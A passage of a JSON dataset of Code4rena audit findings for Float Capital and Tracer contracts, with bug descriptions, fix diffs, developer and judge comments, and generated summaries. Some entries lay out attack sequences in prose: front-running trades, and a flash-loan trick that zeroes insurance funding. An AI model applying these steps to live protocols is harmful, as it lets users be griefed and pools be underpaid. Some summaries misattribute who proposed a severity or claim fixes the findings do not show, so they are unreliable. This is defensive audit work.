not price update is occurring, there is likely an issue with the oracle, and our system is not failing even in light of this issue. It is effectively paused until a new price update is given. As Jason mentions we can use the oracle manager to fix this\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/16#issuecomment-906047797):**\n > Due to the ability to update the oracle, funds would not be lost, but it would be an availability risk (even if temporary) for the system.  Based on that I am downgrading to a 2.\n\n",
      "summary": "\nThis bug report is about the LongShort.sol contract which is a part of the FloatCapital project. It was submitted by gpersoon and cmichel and is related to synthetic tokens and binary option tokens. When the price of these tokens stays constant, the assetPriceHasChanged will never be true and the marketUpdateIndex[marketIndex] will never increase. This means that the _executeOutstandingNextPrice functions will never be executed, and the market will become stuck.\n\nIt is recommended to enhance the _updateSystemStateInternal function so that after a certain period of time without price movements, the entire function is executed. This would include the marketUpdateIndex[marketIndex] += 1. JasoonS (Float) disputed this point, but later changed their opinion to agree with it. Moose-code (Float) believes that the system is built for markets where continuous price updates will occur and that it is likely an issue with the oracle if no price update is occurring. 0xean (judge) downgraded the bug report to a 2 due to the ability to update the oracle and the availability risk (even if temporary) for the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/16",
      "tags": [],
      "finders": []
    },
    {
      "id": "25534",
      "title": "[M-05] Wrong aave usage of `claimRewards`",
      "impact": "MEDIUM",
      "content": "_Submitted by jonah1005_\n\nAave yield manager claims rewards with the payment token. According to aave's document, aToken should be provided.\nThe aave rewards would be unclaimable.\n\nYieldManager's logic in [L161-L170](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/YieldManagerAave.sol#L161-L170)\n\nReference: https://docs.aave.com/developers/guides/liquidity-mining#claimrewards\n\nRecommend changing to\n```solidity\n  address[] memory rewardsDepositedAssets = new address[](1);\n  rewardsDepositedAssets[0] = address(aToken);\n```\n\n**[DenhamPreen (Float) confirmed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/49#issuecomment-896811177):**\n > Great catch!\n>\n> This contract is going to be upgradable but really applicable within this context \n\n**[moose-code (Float) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/49#issuecomment-896845365):**\n > Oof yeah! Good one :)\n>\n> Devil in those documentation details :)\n>\n> ![image](https://user-images.githubusercontent.com/20556729/129041188-b712e09a-f735-44d4-922f-328b156e2461.png)\n\n",
      "summary": "\nA bug was discovered in the Aave Yield Manager contract, where rewards would be unclaimable. According to Aave's documentation, aToken should be provided, but the code in the contract did not reflect this. The code in the contract was changed to address this issue, and the bug was confirmed by DenhamPreen and Moose-Code from Float. The bug was fixed by changing the code in the contract from `address[] memory rewardsDepositedAssets = new address[](0);` to `address[] memory rewardsDepositedAssets = new address[](1); rewardsDepositedAssets[0] = address(aToken);`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/49",
      "tags": [],
      "finders": []
    },
    {
      "id": "25533",
      "title": "[M-04] Staker.sol: Wrong values returned in edge cases of `_calculateFloatPerSecond()`",
      "impact": "MEDIUM",
      "content": "_Submitted by hickuphh3_\n\nIn `_calculateFloatPerSecond()`, the edge cases where full rewards go to either the long or short token returns\n\n`return (1e18 * k * longPrice, 0);` and\n\n`return (0, 1e18 * k * shortPrice);` respectively.\n\nThis is however `1e18` times too large. We can verify this by checking the equivalent calculation in the 'normal case', where we assume all the rewards go to the short token, ie. `longRewardUnscaled = 0`  and `shortRewardUnscaled = 1e18`. Plugging this into the calculation below,\n\n`return ((longRewardUnscaled * k * longPrice) / 1e18, (shortRewardUnscaled * k * shortPrice) / 1e18);` results in\n\n`(0, 1e18 * k * shortPrice / 1e18)` or `(0, k * shortPrice)`.\n\nAs we can see, this would result in an extremely large float token issuance rate, which would be disastrous.\n\nThe edge cases should return `(k * longPrice, 0)` and `(0, k * shortPrice)` in the cases where rewards should go fully to long and short token holders respectively.\n\n**[JasoonS (Float) confirmed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/6#issuecomment-895995908):**\n > Fix:\n> ```diff\n> -return (1e18 * k * longPrice, 0);\n> +return (k * longPrice, 0);\n> ```\n>\n> and\n>\n> ```diff\n> -return (0, 1e18 * k * shortPrice);\n> +return (0, k * shortPrice);\n> ```\n\n**[DenhamPreen (Float) patched](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/6#issuecomment-897480501):**\n > Resolved\n> https://github.com/Float-Capital/monorepo/pull/1085\n\n",
      "summary": "\nA bug report has been submitted by hickuphh3 regarding the function `_calculateFloatPerSecond()` in the code. The bug is related to the edge cases where full rewards go to either the long or short token holders. The code currently returns `(1e18 * k * longPrice, 0)` and `(0, 1e18 * k * shortPrice)` respectively, which is 1e18 times too large. This would result in an extremely large float token issuance rate, which would be disastrous.\n\nThe bug has been confirmed by JasoonS (Float) and patched by DenhamPreen (Float). The fix is to replace the code with `(k * longPrice, 0)` and `(0, k * shortPrice)` in the cases where rewards should go fully to long and short token holders respectively. The bug has been resolved with the pull request at https://github.com/Float-Capital/monorepo/pull/1085.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/6",
      "tags": [],
      "finders": []
    },
    {
      "id": "25532",
      "title": "[M-03] Missing events/timelocks for owner/admin only functions that change critical parameters",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xRajeev, also found by tensors_\n\nOwner/admin only functions that change critical parameters should emit events and have timelocks. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\nThere are owner/admin functions that do not emit any events in `LongShort.sol`. It is not apparent that any owner/admin functions will have timelocks.\n\nSee similar High-severity [H03](https://blog.openzeppelin.com/audius-contracts-audit/#high) finding in OpenZeppelins Audit of Audius and Medium-severity [M01](https://blog.openzeppelin.com/uma-audit-phase-4/) finding OpenZeppelins Audit of UMA Phase 4\n\nSee issue page for referenced code.\n\nRecommend adding events to all owner/admin functions that change critical parameters. Add timelocks to introduce time delays for critical parameter changes that significantly impact market/user incentives/security.\n\n**[JasoonS (Float) acknowledged](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/85#issuecomment-897497116):**\n > We will manage timelocks and multi-sigs externally to these contracts.\n\n**[JasoonS (Float) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/85#issuecomment-898693915):**\n > I would consider this a duplicate of #84 in many ways. (or at least #84 is a sub-issue of this issue)\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/85#issuecomment-905048244):**\n > duplicate of #84 as both offer solutions for dealing with privileged functionality (including the transfer of ownership). Leaving severity as 2 based on the potential risks associated with an incorrect admin change or similar.\n\n",
      "summary": "\nThis bug report highlights the need for owner/admin functions that change critical parameters to emit events and have timelocks. These events allow users to evaluate the changes and decide whether to engage with or exit the protocol, while timelocks introduce time delays for critical parameter changes that affect incentives and security. The report notes that the `LongShort.sol` contract does not have any events or timelocks for such functions, and references similar findings in OpenZeppelin's Audit of Audius (High-severity) and UMA Phase 4 (Medium-severity). The report recommends adding events and timelocks to all owner/admin functions that change critical parameters.\n\nThe report was acknowledged by JasoonS (Float), who stated that they would manage timelocks and multi-sigs externally to the contracts. JasoonS also commented that the issue was a duplicate of another issue (#84). Finally, 0xean (judge) commented that it was a duplicate of #84 and left the severity as 2 based on the potential risks associated with an incorrect admin change or similar.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/85",
      "tags": [],
      "finders": []
    },
    {
      "id": "25531",
      "title": "[M-02] Incorrect balance computed in `getUsersConfirmedButNotSettledSynthBalance()`",
      "impact": "MEDIUM",
      "content": "_Submitted by hack3r-0m and cmichel_\n\nConsider the following state:\n```solidity\nlong_synth_balace = 300;\nshort_synth_balace = 200;\n\nmarketUpdateIndex[1] = x;\nuserNextPrice_currentUpdateIndex = 0;\nuserNextPrice_syntheticToken_toShiftAwayFrom_marketSide[1][true] = 0;\nbatched_amountSyntheticToken_toShiftAwayFrom_marketSide[1][true] = 0;\n```\n\nUser calls `shiftPositionFromLongNextPrice(marketIndex=1, amountSyntheticTokensToShift=100)`\n\nThis results in following state changes:\n```solidity\nlong_synth_balace = 200;\nshort_synth_balace = 200;\nuserNextPrice_syntheticToken_toShiftAwayFrom_marketSide[1][true] = 100;\nbatched_amountSyntheticToken_toShiftAwayFrom_marketSide[1][true] = 100;\nuserNextPrice_currentUpdateIndex = x+1 ;\n```\n\nDue to some other transactions, oracle updates twice, and now the `marketUpdateIndex[1]` is x+2 and also updating price snapshots.\n\nWhen User calls `getUsersConfirmedButNotSettledSynthBalance(user, 1)`\n\ninitial condition:\n```solidity\nif (\n  userNextPrice_currentUpdateIndex[marketIndex][user] != 0 &&\n  userNextPrice_currentUpdateIndex[marketIndex][user] <= currentMarketUpdateIndex\n)\n```\nwill be true;\n[`LongShort.sol` L532](https://github.com/hack3r-0m/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L532)\n```solidity\nsyntheticToken_priceSnapshot[marketIndex][isLong][currentMarketUpdateIndex]\n```\n\nThis uses price of current x+2 th update while it should balance of accounting for price of x+1 th update.\n\n**[JasoonS (Float) confirmed and disagreed with severity](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/142#issuecomment-897368280):**\n > Yes good spot.\n>\n> This function is view only, and is only used for view only purposes. The rest of the system will always operate correctly because it rather uses `_executeOutstandingNextPriceSettlements` than the `getUsersConfirmedButNotSettledSynthBalance`. Therefore I propose this as a **1 Low Risk** vulnerability.\n\n**[0xean (judge) (judge) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/142#issuecomment-905007960):**\n > I am going to align with the 2 (Med Risk) severity.  Reporting the incorrect position in a UI to a user could definitely lead unexpected loss of funds in a sharp market move where a user is intending on hedging elsewhere.\n\n",
      "summary": "\nThis bug report concerns the FloatCapital contract, which is used to track and manage synthetic token balances. When a user calls the `shiftPositionFromLongNextPrice` function with a given market index and amount of synthetic tokens to shift, the user's long and short synthetic token balances are updated accordingly. However, due to the fact that the oracle can update the market index multiple times, the `getUsersConfirmedButNotSettledSynthBalance` function may report an incorrect position in the user interface, which could lead to unexpected losses of funds in a sharp market move. Hack3r-0m and cmichel proposed a severity of 1 Low Risk, while 0xean judged the severity to be 2 Medium Risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/142",
      "tags": [],
      "finders": []
    },
    {
      "id": "25530",
      "title": "[M-01] `latestMarket` used where `marketIndex` should have been used",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon, also found by 0xImpostor, cmichel, shw, hack3r-0m, jonah1005, loop and pauliax_\n\nThe functions `initializeMarket` and `_seedMarketInitially` use the variable `latestMarket`.\nIf these functions would be called seperately from `createNewSyntheticMarket`, then `latestMarket` would have the same value for each call of `initializeMarket` and `_seedMarketInitially`\n\nThis would mean that the `latestMarket` is initialized multiple times and the previous market(s) are not initialized properly.\nNote: the call to addNewStakingFund could have prevented this issue, but also allows this, see separate issue.\n\nNote: the functions can only be called by the admin, so if `createNewSyntheticMarket` and `initializeMarket` are called in combination, then it would not lead to problems,\nbut in future release of the software the calls to `createNewSyntheticMarket` and `initializeMarket` might get separated.\n\n[`LongShort.sol` #L304](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L304)\n```solidity\nfunction _seedMarketInitially(uint256 initialMarketSeedForEachMarketSide, uint32 marketIndex) internal virtual {\n  ...\n  ISyntheticToken(syntheticTokens[latestMarket][true]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);   // should be marketIndex\n  ISyntheticToken(syntheticTokens[latestMarket][false]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);  // should be marketIndex\n\nfunction initializeMarket(\n    uint32 marketIndex,....)\n...\n  require(!marketExists[marketIndex], \"already initialized\");\n  require(marketIndex <= latestMarket, \"index too high\");\n  marketExists[marketIndex] = true;\n..\n  IStaker(staker).addNewStakingFund(\n    `latestMarket`,                                       // should be marketIndex.\n    syntheticTokens[latestMarket][true],   // should be marketIndex\n    syntheticTokens[latestMarket][false],  // should be marketIndex\n...\n```\n\nRecommend replacing `latestMarket` with `marketIndex` in the functions `initializeMarket` and `_seedMarketInitially`.\n\np.s. confirmed by Jason of float capital: Definitely an issue, luckily both of those functions are adminOnly. But that is definitely not ideal!\n\n**[JasoonS (Float) confirmed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/9#issuecomment-896001724):**\n > Great spot!\n>\n> ![image](https://user-images.githubusercontent.com/6032276/128869917-0121e5cb-d550-4d1e-ac25-5c97efdd2ff1.png)\n>\n> Not a risk if you know about it (you just need to launch markets sequentially not in batches), but we didn't. So 2 - medium risk is fair :)\n>\n\n**[DenhamPreen (Float) patched](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/9#issuecomment-897493238):**\n > Resolved PR\n> https://github.com/Float-Capital/monorepo/pull/1106\n\n",
      "summary": "\nA bug was discovered in the functions `initializeMarket` and `_seedMarketInitially` of the contract `LongShort.sol` which uses the variable `latestMarket`. If these functions would be called separately from `createNewSyntheticMarket`, then `latestMarket` would have the same value for each call of `initializeMarket` and `_seedMarketInitially`. This would lead to the `latestMarket` being initialized multiple times and the previous market(s) not being initialized properly. The bug was confirmed by Jason of Float Capital, who rated it as a medium risk. The bug was patched by DenhamPreen of Float Capital in the PR link provided. The recommendation is to replace `latestMarket` with `marketIndex` in the functions `initializeMarket` and `_seedMarketInitially` to prevent the bug from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/9",
      "tags": [],
      "finders": []
    },
    {
      "id": "25529",
      "title": "[H-03] Users could shift tokens on `Staker` with more than he has staked",
      "impact": "HIGH",
      "content": "_Submitted by shw_\n\nThe `shiftTokens` function of `Staker` checks whether the user has staked at least the number of tokens he wants to shift from one side to the other (line 885). A user could call the `shiftTokens` function multiple times before the next price update to shift the staker's token from one side to the other with more than he has staked. [Staker.sol#L885](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L885)\n\nRecommend adding checks on `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long` and `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short` to ensure that the sum of the two variables does not exceed user's stake balance.\n\n**[JasoonS (Float) confirmed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/141#issuecomment-897369855):**\n > Yes, spot on! We spotted this the next morning after launching the competition. Token shifting was a last minute addition to the codebase. Really glad someone spotted it, but only in the last few hours, phew!\n>\n> This would allow a malicious user to completely shift all the tokens (even those not belonging to them to one side or the other!!)\n> No funds could be stolen by the user directly (since the execution of those shifts would fail on the user level), but it could be done for personal gain (eg improving the users FLT issuance rate, or similar economic manipulation).\n\n",
      "summary": "\nA bug was found in the `shiftTokens` function of the `Staker` contract of the FloatCapital competition. The function did not have checks to ensure that the user does not shift more tokens than he has staked. This could have allowed malicious users to manipulate the system for their own gain. The bug was spotted and confirmed by JasoonS (Float) and it was fixed by adding checks on two variables. These checks would ensure that the sum of the two variables does not exceed the user's stake balance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/141",
      "tags": [],
      "finders": []
    },
    {
      "id": "25528",
      "title": "[H-02] 2 variables not indexed by `marketIndex`",
      "impact": "HIGH",
      "content": "_Submitted by gpersoon_\n\nIn the token contract: `batched_stakerNextTokenShiftIndex` is indexed by `marketIndex`, so it can have separate (or the same) values for each different `marketIndex`.\n\n`stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping` and `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping` are not indexed by `marketIndex`.\nSo the values of `stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping` and `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping`\ncan be overwritten by a different market, if `batched_stakerNextTokenShiftIndex[market1]`==`batched_stakerNextTokenShiftIndex[market2]`\n\nThis will lead to weird results in` _calculateAccumulatedFloat`, allocating too much or too little float.\n\n[`Staker.sol` L622](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L622)\n```solidity\nfunction pushUpdatedMarketPricesToUpdateFloatIssuanceCalculations(\n    ...\n      stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping[ batched_stakerNextTokenShiftIndex[marketIndex]  ] = stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mappingIfShiftExecuted;\n      stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping[  batched_stakerNextTokenShiftIndex[marketIndex]  ] = latestRewardIndex[marketIndex] + 1;\n      batched_stakerNextTokenShiftIndex[marketIndex] += 1;\n...\n)\n```\n\nRecommend adding an index with `marketIndex` to the variables:\n- `stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping`\n- `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping`\n\nAlso consider shortening the variable names, this way mistakes can be spotted easier.\n\nConfirmed by Jason of Float Capital: Yes, you are totally right, it should use the `marketIndex` since they are specific per market!\n\n**[JasoonS (Float) confirmed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/8#issuecomment-895999895):**\n > :see_no_evil: Embarrassed by this one!\n>\n> Thank you for the report.\n>\n> Fixed!!\n\n",
      "summary": "\nA bug was reported in the token contract, `batched_stakerNextTokenShiftIndex`, which is indexed by `marketIndex` and can have different values for each different `marketIndex`. However, `stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping` and `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping` were not indexed by `marketIndex`, meaning that the values of these variables could be overwritten by a different market if `batched_stakerNextTokenShiftIndex[market1]`==`batched_stakerNextTokenShiftIndex[market2]`. This could lead to incorrect results in `_calculateAccumulatedFloat`, allocating too much or too little float.\n\nThe bug reporter recommended adding an index with `marketIndex` to the variables `stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping` and `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping`, as well as shortening the variable names to make mistakes easier to spot. Jason of Float Capital confirmed that the bug report was correct and the issue was fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/8",
      "tags": [],
      "finders": []
    },
    {
      "id": "25527",
      "title": "[H-01] copy paste error in `_batchConfirmOutstandingPendingActions`",
      "impact": "HIGH",
      "content": "_Submitted by gpersoon, also found by cmichel and shw_\n\nThe function `_batchConfirmOutstandingPendingActions` of `LongShort.sol` processes the variable `batched_amountSyntheticToken_toShiftAwayFrom_marketSide`, and sets it to 0 after processing. However, probably due to a copy/paste error, in the second instance, where `batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false]` is processed, the wrong version is set to 0: `batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true]` = 0\n\nThis means the next time the `batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false]` is processed again. As it is never reset, it keeps increasing. The result is that the internal administration will be off and far too many tokens will be shifted tokens from SHORT to LONG.\n\n[`LongShort.sol` L1126](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L1126)\n```solidity\nfunction _batchConfirmOutstandingPendingActions(\n..\n    amountForCurrentAction_workingVariable = batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true];\n    batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0;\n...\n    amountForCurrentAction_workingVariable = batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false];\n    batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0; // should probably be false\n)\n```\n\nRecommend changing the second instance of the following (on line 1207)\n`batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0`\nto\n`batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] = 0`\n\np.s. confirmed by Jason of Floatcapital: \"Yes, that should definitely be false!\"\n\n**[JasoonS (Float) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/5#issuecomment-895969550):**\n > Mitigation\n>\n> ```diff\n> - batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0\n> + batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] = 0\n> ```\n\n**[moose-code (Float) confirmed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/5#issuecomment-896714257):**\n > Good attention to detail. Silly on our part.\n\n**[DenhamPreen (Float) patched](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/5#issuecomment-897472713):**\n > https://github.com/Float-Capital/monorepo/pull/1087\n>\n> Resolved PR\n>\n> *note this repo is still private\n\n",
      "summary": "\nA bug report has been submitted regarding the function `_batchConfirmOutstandingPendingActions` of the `LongShort.sol` contract. This function processes the variable `batched_amountSyntheticToken_toShiftAwayFrom_marketSide`, and sets it to 0 after processing. However, due to a copy/paste error, the wrong version of the variable was set to 0, which caused the internal administration to be off and too many tokens to be shifted from SHORT to LONG.\n\nThe issue was confirmed by Jason and Moose-code of Floatcapital, and a patch was released by DenhamPreen to resolve the issue. The patch involved changing the second instance of the following line of code (on line 1207):\n\n`batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0`\n\nto\n\n`batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] = 0`\n\nThis bug report was submitted by gpersoon, also found by cmichel and shw.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Float Capital",
      "source_link": "https://code4rena.com/reports/2021-08-floatcapital",
      "github_link": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/5",
      "tags": [],
      "finders": []
    },
    {
      "id": "25501",
      "title": "[M-13] Trader orders can be front-run and users can be denied from trading",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel, also found by gpersoon and tensors_\n\nThe `Trader` contract accepts two signed orders and tries to match them. Once they are matched and become filled, they can therefore not be matched against other orders anymore.\n\nThis allows for a griefing attack where an attacker can deny any other user from trading by observing the mempool and front-running their trades by creating their own order and match it against the counter order instead.\n\nIn this way, a trader can be denied from trading. The cost of the griefing attack is that the trader has to match the order themselves, however depending on the liquidity of the order book and the spread, they might be able to do the counter-trade again afterwards, basically just paying the fees.\n\nIt could be useful if the attacker is a liquidator and is stopping a user who is close to liquidation from becoming liquid again.\n\nThis seems hard to circumvent in the current design. If the order book is also off-chain, the `executeTrade` could also be a bot-only function.\n\n**[raymogg (Tracer) disputed (in duplicate)](https://github.com/code-423n4/2021-06-tracer-findings/issues/123#issuecomment-873755673)**\n> Marked as a dispute as this is not really an issue. Tracer will initially maintain an off chain order book that is the entry point for users to make orders (and for market makers to interact with).\n>\n> Orders only get propagated on chain once they have been matched, and they will only be propagated on chain by whitelisted relayers. As such nobody can arbitrarily frontrun the orders with their own.\n\n**[cemozerr (Judge) commented](https://github.com/code-423n4/2021-06-tracer-findings/issues/123#issuecomment-882119567):**\n > Currently not seeing a whitelisted relayer functionality, so marking this a valid medium risk issue.\n\n",
      "summary": "\nA bug has been identified in the `Trader` contract which allows for a griefing attack. This attack allows an attacker to deny other users from trading by observing the mempool and front-running their trades by creating their own order and matching it against the counter order instead. The cost of the attack is that the trader has to match the order themselves, however they may be able to do the counter-trade again afterwards, paying the fees. It could be useful if the attacker is a liquidator and is stopping a user who is close to liquidation from becoming liquid again.\n\nInitially it was disputed that this was not an issue, as Tracer will maintain an off-chain order book that is the entry point for users to make orders and for market makers to interact with, and orders only get propagated on chain once they have been matched, and they will only be propagated on chain by whitelisted relayers. However, as there is currently no whitelisted relayer functionality, it was marked as a valid medium risk issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/100",
      "tags": [],
      "finders": []
    },
    {
      "id": "25500",
      "title": "[M-12] avoid paying insurance",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\nIt's possible to avoid paying insurance in the following way:\n\n- once per hour (at the right moment), do the following:\n1. using a flash loan, or with a large amount of tokens, call `deposit` of `Insurance.sol` to make sure that the pool is sufficiently filled (`poolHoldings` > `poolTarget`)\n2. call the function `executeTrade` of Trader`.sol` with a minimal trade (possibly of value 0, see finding \"`executeTrade` with same trades\")\n3. `executeTrade` calls `matchOrders`, which calls `recordTrade`\n4. `recordTrade` calls `updateFundingRate()`;   (once per hour, so you have to be sure you do it in time before other trades trigger this)\n5. `updateFundingRate` calls `getPoolFundingRate`\n6. `getPoolFundingRate` determines the insurance rate, but because the insurance pool is sufficiently full (due to the flash loan), the rate is 0\n7. `updateFundingRate` stores the 0 rate via `setInsuranceFundingRate`  (which is used later on to calculate the amounts for the insurances)\n8. withdraw from the Insurance and pay back the flash loan\n\nThe insurance rates are 0 now and no-one pays insurance. The gas costs relative to the insurance costs + the flash loan fees determine if this is an economically viable attack. Otherwise it is still a grief attack.\nThis will probably be detected pretty soon because the insurance pool will stay empty. However its difficult to prevent.\n\nSee issue page for code referenced in proof of concept.\n\nRecommend setting a timelock on withdrawing insurance.\n\n**[raymogg (Tracer) confirmed but disagreed with severity](https://github.com/code-423n4/2021-06-tracer-findings/issues/30#issuecomment-873763520):**\n > Really like this exploit idea. Currently this is possible since the Trader is not whitelisted (eg there is no whitelisted relayer address). With this added, this exploit is no longer possible as only off chain relayers can place orders with the trader.\n>\n> Disagree with the severity mainly due to the fact that executing this exploit once would only cause insurance funding to not be paid for a single hour. For insurance funding to never be paid, you would have to time this transaction as the first transaction on each and every hour. This would quickly be noticed. The only affect on this would be insurance depositors miss interest payments for a few periods.\n\n**[cemozerr (Judge) commented](https://github.com/code-423n4/2021-06-tracer-findings/issues/30#issuecomment-882109332):**\n > Marking this as medium risk as a front-runner could keep doing this for not paying any funding using a bot.\n\n",
      "summary": "\nA bug has been identified in the code of a project that allows users to avoid paying insurance. This bug can be exploited by using a flash loan or large amount of tokens to call `deposit` of `Insurance.sol` to ensure the pool is sufficiently filled, followed by calling the function `executeTrade` of `Trader`.sol` with a minimal trade. This will then call `recordTrade` which calls `updateFundingRate` and `getPoolFundingRate`, resulting in the insurance rate being set to 0. The user can then withdraw from the Insurance and pay back the flash loan.\n\nThe severity of this bug has been debated, with some suggesting it is a medium risk as a front-runner could keep doing this for not paying any funding using a bot, while others disagree with the severity, noting that executing this exploit once would only cause insurance funding to not be paid for a single hour, and that for insurance funding to never be paid, the exploit would have to be timed as the first transaction on each and every hour, which would quickly be noticed.\n\nThe code referenced in the proof of concept can be found on the issue page, and it is recommended to set a timelock on withdrawing insurance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/30",
      "tags": [],
      "finders": []
    },
    {
      "id": "25499",
      "title": "[M-11] Claim liquidation escrow",
      "impact": "MEDIUM",
